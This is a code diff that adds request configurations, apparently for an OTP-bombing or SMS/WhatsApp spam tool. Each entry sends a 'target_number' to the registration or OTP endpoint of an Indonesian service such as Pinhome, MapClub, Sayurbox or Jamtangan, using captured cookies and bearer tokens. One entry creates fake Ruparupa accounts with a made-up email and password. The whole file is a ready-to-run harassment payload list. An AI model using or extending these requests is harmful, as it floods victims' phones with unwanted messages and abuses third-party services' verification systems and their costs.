@@ -99,5 +99,337 @@
             "x-device": "web-customer",
             "x-device-version": "2.3.4"
         }
+    },  {
+    "name": "Pinhome",
+    "method": "post",
+    "url": "https://www.pinhome.id/api/pinaccount/request/otp",
+    "data": json.dumps({
+        "accountType": "customers",    # Tipe akun, misalnya "customers"
+        "countryCode": "62",           # Kode negara, dalam hal ini "62" untuk Indonesia
+        "medium": "whatsapp",          # Media pengiriman OTP, misalnya "whatsapp"
+        "otpType": "register",         # Jenis OTP, misalnya "register"
+        "phoneNumber": target_number   # Nomor telepon target
+    }),
+    "headers": {
+        "Host": "www.pinhome.id",
+        "accept": "application/json",
+        "accept-encoding": "gzip, deflate, br, zstd",
+        "accept-language": "id",
+        "authorization": "Bearer 13d2886acc908192d0c33325b44a617e5e3395481cc03cbfd67de34886399731",
+        "content-length": "115",
+        "content-type": "application/json",
+        "cookie": "_hhcftd=f3541e756a96c0f8fb72be550f91620f03bcfff8; active_language=id; utm_source=google; utm_medium=sem; utm_term=supply_brand; utm_content=pinhome; utm_campaign=primary_x_secondary_owner_conversion_listing_upload_pcw; _gcl_gs=2.1.k1$i1725276416; _gcl_au=1.1.1802820682.1725276418; _tt_enable_cookie=1; _ttp=aSNUKcyLO3fxojzHy1G7a1rep1q; _fbp=fb.1.1725276419401.43595963584771814; _ga=GA1.1.662671537.1725276444; _gcl_aw=GCL.1725276446.CjwKCAjwxNW2BhAkEiwA24Cm9MtTj1thTi4FEfM0NFWOdqoDDAhUTG5KkOYQrcJhiBrfE4v4wLbsIBoCR-QQAvD_BwE; _ga_Y1EHRSKVLJ=GS1.1.1725276445.1.0.1725276445.60.0.0; _ga_CYRVZ1HEXG=GS1.1.1725276444.1.0.1725276458.0.0.0",
+        "origin": "https://www.pinhome.id",
+        "referer": "https://www.pinhome.id/daftar?redirect=%2Flayanan%2Fpasang-iklan-gratis%3Futm_source%3Dgoogle%26utm_medium%3Dsem%26utm_campaign%3Dprimary_x_secondary_owner_conversion_listing_upload_pcw%26utm_term%3Dsupply_brand%26utm_content%3Dpinhome%26gad_source%3D1%26gclid%3DCjwKCAjwxNW2BhAkEiwA24Cm9MtTj1thTi4FEfM0NFWOdqoDDAhUTG5KkOYQrcJhiBrfE4v4wLbsIBoCR-QQAvD_BwE&redirectFrom=zone",
+        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
+        "x-auth": "Bearer 63cb746000e1f88adaede0b65928daecac1914832d5fb20538209a76ae1754ea"
     }
+},
+{
+    "name": "Momobil",
+    "method": "post",
+    "url": "https://api.momobil.id/users/otp/send",
+    "data": json.dumps({
+        "to": target_number,     # Variabel nomor telepon target
+        "type": "register"       # Jenis OTP, dalam hal ini untuk registrasi
+    }),
+    "headers": {
+        "accept": "*/*",
+        "accept-encoding": "gzip, deflate, br, zstd",
+        "accept-language": "en-US,en;q=0.9,id;q=0.8",
+        "content-length": "39",
+        "content-type": "application/json",
+        "origin": "https://momobil.id",
+        "referer": "https://momobil.id/",
+        "sec-ch-ua": "\"Chromium\";v=\"128\", \"Not;A=Brand\";v=\"24\", \"Google Chrome\";v=\"128\"",
+        "sec-ch-ua-mobile": "?0",
+        "sec-ch-ua-platform": "\"Windows\"",
+        "sec-fetch-dest": "empty",
+        "sec-fetch-mode": "cors",
+        "sec-fetch-site": "same-site",
+        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
+        "Host": "api.momobil.id",
+        "authority": "api.momobil.id",
+        "scheme": "https"
+    }
+},
+{
+    "name": "MapClub",
+    "method": "post",
+    "url": "https://beryllium.mapclub.com/api/member/registration/sms/otp?channel=WHATSAPP",
+    "data": json.dumps({
+        "account": target_number   # Nomor telepon target
+    }),
+    "headers": {
+        "Host": "beryllium.mapclub.com",
+        "accept": "application/json, text/plain, */*",
+        "accept-encoding": "gzip, deflate, br, zstd",
+        "accept-language": "in-ID",
+        "authorization": "Bearer eyJhbGciOiJIUzUxMiJ9.eyJndWVzdENvZGUiOiIwMzgyN2IzMS0zODFiLTRlOWEtOWFlNy1jY2NkZDgwMTlkNGEiLCJleHBpcmVkIjoxNzI1MzY0OTE1NDA0LCJleHBpcmUiOjM2MDAsImV4cCI6MTcyNTM2NDkxNSwiaWF0IjoxNzI1MzYxMzE1LCJwbGF0Zm9ybSI6IldFQiJ9._1oI5nth3kUbo3Ene1dcMXNzqwN6V8CqFK8DZuEHDtox94Uir7ho6Nxc6HMRwZYeIMaq4XmL1_sRe_duUsRoQQ",
+        "client-platform": "WEB",
+        "client-timestamp": "1725357616072",
+        "connection": "keep-alive",
+        "content-length": "25",
+        "content-type": "application/json",
+        "origin": "https://www.mapclub.com",
+        "referer": "https://www.mapclub.com/",
+        "sec-ch-ua": "\"Chromium\";v=\"128\", \"Not;A=Brand\";v=\"24\", \"Google Chrome\";v=\"128\"",
+        "sec-ch-ua-mobile": "?0",
+        "sec-ch-ua-platform": "\"Windows\"",
+        "sec-fetch-dest": "empty",
+        "sec-fetch-mode": "cors",
+        "sec-fetch-site": "same-site",
+        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
+    }
+},
+{
+    "name": "Dekoruma_OTP",
+    "method": "post",
+    "url": "https://auth.dekoruma.com/api/v1/register/request-otp-phone-number/?format=json",
+    "data": json.dumps({
+        "phoneNumber": target_number,
+        "platform": "sms",
+        "captchaInput": ""
+    }),
+    "headers": {
+        "Host": "auth.dekoruma.com",
+        "accept": "*/*",
+        "accept-encoding": "gzip, deflate, br, zstd",
+        "accept-language": "en-US,en;q=0.9,id;q=0.8",
+        "content-length": "67",
+        "content-type": "application/json",
+        "cookie": "jwt=\"JWT eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiYjM0Yzc0NjAtYzZhZS00YjQxLTg0NjEtNTAyODU0MDZlMjI5IiwidXNlcl9pZCI6bnVsbCwiZ3JvdXBzIjpbXSwiaXNfYW5vbnltb3VzIjp0cnVlLCJ2ZXJzaW9uIjoiMi4wIiwiaXNzIjoiYXV0aC5kZWtvcnVtYS5jb20iLCJleHAiOjE3MzU3MzI5NTMuMTMwOTExLCJpYXQiOjE3MjUzNjQ5NTMuMTMwOTExfQ.P1rpo8tEnUtz5dI48kqT-WIkvcNSuZuYNgfYFcH5xE2ZD5fT0y6K4NwI0U1v6y1jTcBACQEOlCByXVZ60tUA-Q\"",
+        "origin": "https://www.dekoruma.com",
+        "priority": "u=1, i",
+        "referer": "https://www.dekoruma.com/",
+        "sec-ch-ua": "\"Chromium\";v=\"128\", \"Not;A=Brand\";v=\"24\", \"Google Chrome\";v=\"128\"",
+        "sec-ch-ua-mobile": "?0",
+        "sec-ch-ua-platform": "\"Windows\"",
+        "sec-fetch-dest": "empty",
+        "sec-fetch-mode": "cors",
+        "sec-fetch-site": "same-site",
+        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
+    }
+},
+{
+    "name": "Danacita_Mobile_Register",
+    "method": "post",
+    "url": "https://api.danacita.co.id/v4/users/mobile_register/",
+    "data": json.dumps({
+        "username": target_number,
+        "is_whatsapp_available": True
+    }),
+    "headers": {
+        "Host": "api.danacita.co.id",
+        "accept": "application/json, text/plain, */*",
+        "accept-encoding": "gzip, deflate, br, zstd",
+        "accept-language": "en-US,en;q=0.9,id;q=0.8",
+        "content-length": "58",
+        "content-type": "application/json",
+        "cookie": "_ga=GA1.1.1542053884.1725365484; _ce.irv=new; cebs=1; _ce.clock_event=1; _ce.clock_data=-4192%2C112.78.40.206%2C1%2Ce8db1a910ee088b469ecfd2b6a9b9da5%2CChrome%2CID; cebsp_=1; _ga_V9673QHFM5=GS1.1.1725365484.1.0.1725365496.48.0.0; _ce.s=v~6d48c00a68c0b4082a1836d02ad33b69a04aa0a1~lcw~1725365500263~lva~1725365484753~vpv~0~as~false~v11.fhb~1725365485053~v11.lhb~1725365485054~v11.cs~356027~v11.s~a3f34710-69ed-11ef-8062-498885603553~v11.sla~1725365500263~gtrk.la~m0me2kbr~lcw~1725365500263",
+        "origin": "https://app.danacita.co.id",
+        "priority": "u=1, i",
+        "referer": "https://app.danacita.co.id/",
+        "sec-ch-ua": "\"Chromium\";v=\"128\", \"Not;A=Brand\";v=\"24\", \"Google Chrome\";v=\"128\"",
+        "sec-ch-ua-mobile": "?0",
+        "sec-ch-ua-platform": "\"Windows\"",
+        "sec-fetch-dest": "empty",
+        "sec-fetch-mode": "cors",
+        "sec-fetch-site": "same-site",
+        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
+    }
+},
+{
+    "name": "Danacita_Mobile_Register",
+    "method": "post",
+    "url": "https://api.danacita.co.id/v4/users/mobile_register/",
+    "data": json.dumps({
+        "username": target_number
+    }),
+    "headers": {
+        "Host": "api.danacita.co.id",
+        "accept": "application/json, text/plain, */*",
+        "accept-encoding": "gzip, deflate, br, zstd",
+        "accept-language": "en-US,en;q=0.9,id;q=0.8",
+        "content-length": "29",
+        "content-type": "application/json",
+        "cookie": "_ga=GA1.1.1542053884.1725365484; _ce.irv=new; cebs=1; _ce.clock_event=1; _ce.clock_data=-4192%2C112.78.40.206%2C1%2Ce8db1a910ee088b469ecfd2b6a9b9da5%2CChrome%2CID; cebsp_=3; _ga_V9673QHFM5=GS1.1.1725365484.1.1.1725365847.37.0.0; _ce.s=v~6d48c00a68c0b4082a1836d02ad33b69a04aa0a1~lcw~1725365849159~lva~1725365484753~vpv~0~as~false~v11.fhb~1725365485053~v11.lhb~1725365824066~v11.cs~356027~v11.s~a3f34710-69ed-11ef-8062-498885603553~v11.sla~1725365849159~gtrk.la~m0mea1jb~lcw~1725365849159",
+        "origin": "https://app.danacita.co.id",
+        "priority": "u=1, i",
+        "referer": "https://app.danacita.co.id/",
+        "sec-ch-ua": "\"Chromium\";v=\"128\", \"Not;A=Brand\";v=\"24\", \"Google Chrome\";v=\"128\"",
+        "sec-ch-ua-mobile": "?0",
+        "sec-ch-ua-platform": "\"Windows\"",
+        "sec-fetch-dest": "empty",
+        "sec-fetch-mode": "cors",
+        "sec-fetch-site": "same-site",
+        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
+    }
+},
+{
+    "name": "Carsome_SaveUserInfo",
+    "method": "post",
+    "url": "https://www.carsome.id/website/login/saveUserInfo",
+    "data": json.dumps({
+        "phone": target_number
+    }),
+    "headers": {
+        "Host": "www.carsome.id",
+        "accept": "application/json, text/plain, */*",
+        "accept-encoding": "gzip, deflate, br, zstd",
+        "accept-language": "en-US,en;q=0.9,id;q=0.8",
+        "content-length": "23",
+        "content-type": "application/json",
+        "cookie": "__cf_bm=ixRxtNhtsimxO_PzRHqo1ahbJKKAf7lzxwfeP28MwWk-1725438300-1.0.1.1-fHEy0Nz1w3x_QewhPVjh_59kdHRhXazfwVhP4ZKLicZo7Oj6pT0dMFhQi8uhdZbXgKJOB9VsexBj30lhFBHQpg; amp_4b05bb=IQ46_BB2tas0q_QuwpOl0Y...1i6u265ce.1i6u265ce.0.0.0; ajs_anonymous_id=f6c3d575-36bf-4026-a3fe-fc77dfce3783; _ga=GA1.1.297325087.1725438307; _gcl_au=1.1.109891171.1725438308; __rtbh.uid=%7B%22eventType%22%3A%22uid%22%2C%22id%22%3A%22unknown%22%7D; __rtbh.lid=%7B%22eventType%22%3A%22lid%22%2C%22id%22%3A%22TzepMZOzbgsIZPEZ7hfj%22%7D; _hjSessionUser_1895264=eyJpZCI6IjhjZDM3OWZmLTI1N2MtNTI1MC1iNzQ3LTJlNTY5ZjM4YzFiYiIsImNyZWF0ZWQiOjE3MjU0MzgzMDg1NzAsImV4aXN0aW5nIjpmYWxzZX0=; _hjSession_1895264=eyJpZCI6IjkwZmFiMjExLTM4YTktNGFjYi05MDY4LTcyODFkZTY5MzZjNCIsImMiOjE3MjU0MzgzMDg1NzIsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MX0=; moe_uuid=327de5cf-d87e-4411-9fae-b5c74716cb15; _clck=1es2hge%7C2%7Cfow%7C0%7C1708; _clsk=1hcpzei%7C1725438310088%7C1%7C1%7Cv.clarity.ms%2Fcollect; _uetsid=339ec4e06a9711efab44cba3cb1a8751; _uetvid=339ef1406a9711efa26a893130535915; _ga_L3ZY5XJB08=GS1.1.1725438306.1.1.1725438343.23.0.0",
+        "origin": "https://www.carsome.id",
+        "priority": "u=1, i",
+        "referer": "https://www.carsome.id/",
+        "sec-ch-ua": "\"Chromium\";v=\"128\", \"Not;A=Brand\";v=\"24\", \"Google Chrome\";v=\"128\"",
+        "sec-ch-ua-mobile": "?0",
+        "sec-ch-ua-platform": "\"Windows\"",
+        "sec-fetch-dest": "empty",
+        "sec-fetch-mode": "cors",
+        "sec-fetch-site": "same-origin",
+        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
+    }
+},
+{
+    "name": "Carsome_SaveUserInfo_Alt",
+    "method": "post",
+    "url": "https://www.carsome.id/website/login/saveUserInfo",
+    "data":json.dumps({
+        "phone": target_number
+    }),
+    "headers": {
+        "Host": "www.carsome.id",
+        "accept": "application/json, text/plain, */*",
+        "accept-encoding": "gzip, deflate, br, zstd",
+        "accept-language": "en-US,en;q=0.9,id;q=0.8",
+        "content-length": "23",
+        "content-type": "application/json",
+        "cookie": "__cf_bm=ixRxtNhtsimxO_PzRHqo1ahbJKKAf7lzxwfeP28MwWk-1725438300-1.0.1.1-fHEy0Nz1w3x_QewhPVjh_59kdHRhXazfwVhP4ZKLicZo7Oj6pT0dMFhQi8uhdZbXgKJOB9VsexBj30lhFBHQpg; ajs_anonymous_id=f6c3d575-36bf-4026-a3fe-fc77dfce3783; _ga=GA1.1.297325087.1725438307; _gcl_au=1.1.109891171.1725438308; __rtbh.uid=%7B%22eventType%22%3A%22uid%22%2C%22id%22%3A%22unknown%22%7D; __rtbh.lid=%7B%22eventType%22%3A%22lid%22%2C%22id%22%3A%22TzepMZOzbgsIZPEZ7hfj%22%7D; _hjSession_1895264=eyJpZCI6IjkwZmFiMjExLTM4YTktNGFjYi05MDY4LTcyODFkZTY5MzZjNCIsImMiOjE3MjU0MzgzMDg1NzIsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MX0=; moe_uuid=327de5cf-d87e-4411-9fae-b5c74716cb15; _clck=1es2hge%7C2%7Cfow%7C0%7C1708; amp_4b05bb=IQ46_BB2tas0q_QuwpOl0Y...1i6u265ce.1i6u2ioou.0.0.0; _hjSessionUser_1895264=eyJpZCI6IjhjZDM3OWZmLTI1N2MtNTI1MC1iNzQ3LTJlNTY5ZjM4YzFiYiIsImNyZWF0ZWQiOjE3MjU0MzgzMDg1NzAsImV4aXN0aW5nIjp0cnVlfQ==; _clsk=1hcpzei%7C1725438717720%7C2%7C1%7Cv.clarity.ms%2Fcollect; _uetsid=339ec4e06a9711efab44cba3cb1a8751; _uetvid=339ef1406a9711efa26a893130535915; _ga_L3ZY5XJB08=GS1.1.1725438306.1.1.1725438729.35.0.0",
+        "origin": "https://www.carsome.id",
+        "priority": "u=1, i",
+        "referer": "https://www.carsome.id/",
+        "sec-ch-ua": "\"Chromium\";v=\"128\", \"Not;A=Brand\";v=\"24\", \"Google Chrome\";v=\"128\"",
+        "sec-ch-ua-mobile": "?0",
+        "sec-ch-ua-platform": "\"Windows\"",
+        "sec-fetch-dest": "empty",
+        "sec-fetch-mode": "cors",
+        "sec-fetch-site": "same-origin",
+        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
+        "x-language": "id",
+        "x-platform": "web",
+        "x-token": "Console insights are live in Europe"
+    }
+},
+{
+    "name": "Sayurbox_LoginOtp_Request",
+    "method": "POST",
+    "url": "https://www.sayurbox.com/graphql/v1",
+    "data": json.dumps({
+        "operationName": "MutationLoginOtp",
+        "variables": {
+            "mobileNumber": target_number
+        },
+        "query": "mutation MutationLoginOtp($mobileNumber: String!) {\n  mutationLoginOtp(mobileNumber: $mobileNumber)\n}\n"
+    }),
+    "headers": {
+        "accept": "*/*",
+        "accept-encoding": "gzip, deflate, br, zstd",
+        "accept-language": "en-US,en;q=0.9,id;q=0.8",
+        "authorization": "eyJhbGciOiJSUzI1NiIsImtpZCI6ImY4NDY2MjEyMTQxMjQ4NzUxOWJiZjhlYWQ4ZGZiYjM3ODYwMjk5ZDciLCJ0eXAiOiJKV1QifQ.eyJhbm9ueW1vdXMiOnRydWUsImF1ZCI6InNheXVyYm94LWF1ZGllbmNlIiwiYXV0aF90aW1lIjoxNzI1NDM4OTE4LCJleHAiOjE3MjgwMzA5MTgsImlhdCI6MTcyNTQzODkxOCwiaXNzIjoiaHR0cHM6Ly93d3cuc2F5dXJib3guY29tIiwibWV0YWRhdGEiOnsiZGV2aWNlX2luZm8iOm51bGwsInRlbmFudCI6ImIyYyJ9LCJuYW1lIjpudWxsLCJwaWN0dXJlIjpudWxsLCJwcm92aWRlcl9pZCI6ImFub255bW91cyIsInNpZCI6IjYxMDY4MjgwLTA2YTQtNDlkMy04ZWNiLWRhMTlkMjgzOTQyOSIsInN1YiI6Ijc3clhnSnpORDZrVEdrTnlIQ0JzT1AwYnZ3Tk0iLCJ1c2VyX2lkIjoiNzdyWGdKek5ENmtUR2tOeUhDQnNPUDBidndOTSJ9.k3iqkJiBNNTfVItMEdbKlyv9DrcfXvzDOIQJgVT8My5_GT3ddyMxoFKh4LzBAeg3Qj5mkRFTxHDkKZEw97t5YnQ3vpJsHoueqnAy31HosQm3kDS4WHNsxOLEOcAaanQp8p5pFHF9e0RzvB8lxH25xrzrA0m2SfXe89K8s489-cQDpKVQE96VTF6kP_PLIboUxQR2qrnUbsvuZB12Qh3uyG7pYm3YCVy5-ckmlFSYz-qFExkHCmXXQ0HsXUd8g1atJ6ARo0UAbfaJB0pXs-0UgxUzUZQfUBb4AMOoVgPdMYUhx9dV_ZlJv65qb04UpC-8DpJOHm3cTYNdDCfSreNDWQ",
+        "content-length": "507",
+        "content-type": "application/json",
+        "cookie": "_sbox_lang=id; __cnf=cnf0927; token=eyJhbGciOiJSUzI1NiIsImtpZCI6ImY4NDY2MjEyMTQxMjQ4NzUxOWJiZjhlYWQ4ZGZiYjM3ODYwMjk5ZDciLCJ0eXAiOiJKV1QifQ.eyJhbm9ueW1vdXMiOnRydWUsImF1ZCI6InNheXVyYm94LWF1ZGllbmNlIiwiYXV0aF90aW1lIjoxNzI1NDM4OTE4LCJleHAiOjE3MjgwMzA5MTgsImlhdCI6MTcyNTQzODkxOCwiaXNzIjoiaHR0cHM6Ly93d3cuc2F5dXJib3guY29tIiwibWV0YWRhdGEiOnsiZGV2aWNlX2luZm8iOm51bGwsInRlbmFudCI6ImIyYyJ9LCJuYW1lIjpudWxsLCJwaWN0dXJlIjpudWxsLCJwcm92aWRlcl9pZCI6ImFub255bW91cyIsInNpZCI6IjYxMDY4MjgwLTA2YTQtNDlkMy04ZWNiLWRhMTlkMjgzOTQyOSIsInN1YiI6Ijc3clhnSnpORDZrVEdrTnlIQ0JzT1AwYnZ3Tk0iLCJ1c2VyX2lkIjoiNzdyWGdKek5ENmtUR2tOeUhDQnNPUDBidndOTSJ9.k3iqkJiBNNTfVItMEdbKlyv9DrcfXvzDOIQJgVT8My5_GT3ddyMxoFKh4LzBAeg3Qj5mkRFTxHDkKZEw97t5YnQ3vpJsHoueqnAy31HosQm3kDS4WHNsxOLEOcAaanQp8p5pFHF9e0RzvB8lxH25xrzrA0m2SfXe89K8s489-cQDpKVQE96VTF6kP_PLIboUxQR2qrnUbsvuZB12Qh3uyG7pYm3YCVy5-ckmlFSYz-qFExkHCmXXQ0HsXUd8g1atJ6ARo0UAbfaJB0pXs-0UgxUzUZQfUBb4AMOoVgPdMYUhx9dV_ZlJv65qb04UpC-8DpJOHm3cTYNdDCfSreNDWQ; localSessionId=3KDTVQeNvL-tqqVITqjrT:1725438918505; localSessionIdExpire=1725438918505; _gcl_au=1.1.279291584.1725438920; _ga=GA1.1.295066067.1725438920; _ga_RG03K1J7BE=GS1.1.1725438920.1.0.1725438920.0.0.0; _tt_enable_cookie=1; _ttp=fJxVHR4anro4K5-__oRHesypjMg; afUserId=6abdfb5c-4f15-4df4-a225-aa6128841ec8-p; AF_SYNC=1725438921283; _ga_MHTN2YH4H8=GS1.1.1725438919.1.1.1725439168.58.0.0; _clck=1es2hge%7C2%7Cfow%7C0%7C1708; amp_4b05bb=IQ46_BB2tas0q_QuwpOl0Y...1i6u265ce.1i6u2ioou.0.0.0; _hjSessionUser_1895264=eyJpZCI6IjhjZDM3OWZmLTI1N2MtNTI1MC1iNzQ3LTJlNTY5ZjM4YzFiYiIsImNyZWF0ZWQiOjE3MjU0MzgzMDg1NzAsImV4aXN0aW5nIjp0cnVlfQ==; _clsk=1hcpzei%7C1725438717720%7C2%7C1%7Cv.clarity.ms%2Fcollect; _uetsid=339ec4e06a9711efab44cba3cb1a8751; _uetvid=339ef1406a9711efa26a893130535915; _ga_L3ZY5XJB08=GS1.1.1725438306.1.1.1725438729.35.0.0",
+        "origin": "https://www.sayurbox.com",
+        "referer": "https://www.sayurbox.com/",
+        "sec-ch-ua": "\"Chromium\";v=\"128\", \"Not;A=Brand\";v=\"24\", \"Google Chrome\";v=\"128\"",
+        "sec-ch-ua-mobile": "?0",
+        "sec-ch-ua-platform": "\"Windows\"",
+        "sec-fetch-dest": "empty",
+        "sec-fetch-mode": "cors",
+        "sec-fetch-site": "same-origin",
+        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
+        "x-language": "id",
+        "x-platform": "web",
+        "x-token": "Console insights are live in Europe"
+    }
+},
+{
+    "name": "Jamtangan_SendOtp",
+    "method": "post",
+    "url": "https://gateway.jamtangan.com/query",
+    "data": json.dumps([
+        {
+            "operationName": "sendOtp",
+            "query": "mutation sendOtp($input: sendOtpReq!) {\n  sendOtp(input: $input) {\n    meta {\n      code\n      error\n      message\n    }\n    result {\n      input\n      attempt\n      nextTimeAttempt\n      maxAttempt\n      expiry\n      sent\n    }\n  }\n}\n",
+            "variables": {
+                "input": {
+                    "input": target_number,
+                    "source": "signup",
+                    "sendVia": "whatsapp"
+                }
+            }
+        }
+    ]),
+    "headers": {
+        "Host": "gateway.jamtangan.com",
+        "accept": "*/*",
+        "accept-encoding": "gzip, deflate, br, zstd",
+        "accept-language": "en-US,en;q=0.9,id;q=0.8",
+        "content-length": "379",
+        "content-type": "application/json",
+        "cookie": "session_access_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhY2Nlc3NfdXVpZCI6Ijk0MmM3ZTYwLWFlNzYtNGE5MS05NjNmLTBhZjhmZjYwZmJkMyIsImFjY291bnRfZW1haWwiOiIiLCJhY2NvdW50X2lkIjowLCJhY2NvdW50X3R5cGUiOiJVU0VSIiwiZXhwIjoxNzI1NDQwNTU3LCJpc19sb2dpbiI6ZmFsc2V9.hE1cLyjnk7NlVCR4TnLZ6TuSLUv_9vfuEsO0HkFsHkw; session_refresh_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhY2NvdW50X2VtYWlsIjoiIiwiYWNjb3VudF9pZCI6MCwiYWNjb3VudF90eXBlIjoiVVNFUiIsImV4cCI6MTcyNjY0OTI1NywiaXNfbG9naW4iOmZhbHNlLCJyZWZyZXNoX3V1aWQiOiJmMDVkNWZlNC1kZTNjLTRlYjgtODg3NS0zZjViNWU0NzFmMDMifQ.xhFTs4Ih4KWhtCZlQGMt3gGovlcGzE4MyIbjYDMVoT8",
+        "origin": "https://www.jamtangan.com",
+        "priority": "u=1, i",
+        "sec-ch-ua": "\"Chromium\";v=\"128\", \"Not;A=Brand\";v=\"24\", \"Google Chrome\";v=\"128\"",
+        "sec-ch-ua-mobile": "?0",
+        "sec-ch-ua-platform": "\"Windows\"",
+        "sec-fetch-dest": "empty",
+        "sec-fetch-mode": "cors",
+        "sec-fetch-site": "same-site",
+        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
+    }
+},
+{
+    "name": "Ruparupa_Register",
+    "method": "post",
+    "url": "https://wapi.ruparupa.com/klk/register",
+    "data": json.dumps({
+        "name": "wqertg rff",
+        "birthday": "1994-09-04",
+        "email": "kocakajalu@gmail.com",
+        "newPhone": target_number,
+        "confirmPassword": "wqgftryrgefwA",
+        "employeeCode": "",
+        "internationalPhoneCode": "ID",
+        "minicart_id": None,
+        "password": "wqgftryrgefwA"
+    }),
+    "headers": {
+        "Host": "wapi.ruparupa.com",
+        "accept": "application/json",
+        "accept-encoding": "gzip, deflate, br, zstd",
+        "accept-language": "en-US,en;q=0.9,id;q=0.8",
+        "b2b-type": "non-b2b",
+        "content-length": "229",
+        "content-type": "application/json",
+        "origin": "https://www.ruparupa.com",
+        "priority": "u=1, i",
+        "referer": "https://www.ruparupa.com/auth/register?action=register&component=profile-form-1",
+        "rr-sid": "Fygqb17254412342hHDZHCzck",
+        "sec-ch-ua": "\"Chromium\";v=\"128\", \"Not;A=Brand\";v=\"24\", \"Google Chrome\";v=\"128\"",
+        "sec-ch-ua-mobile": "?0",
+        "sec-ch-ua-platform": "\"Windows\"",
+        "sec-fetch-dest": "empty",
+        "sec-fetch-mode": "cors",
+        "sec-fetch-site": "same-site",
+        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
+        "user-platform": "desktop",
+        "x-company-name": "ruparupa",
+        "x-frontend-type": "desktop",
+        "x-request-id": "U2FsdGVkX1+yMM7kWmc+rLXrKjL6P5Isr3RyQjZcjBc="
+    }
+}
 ]
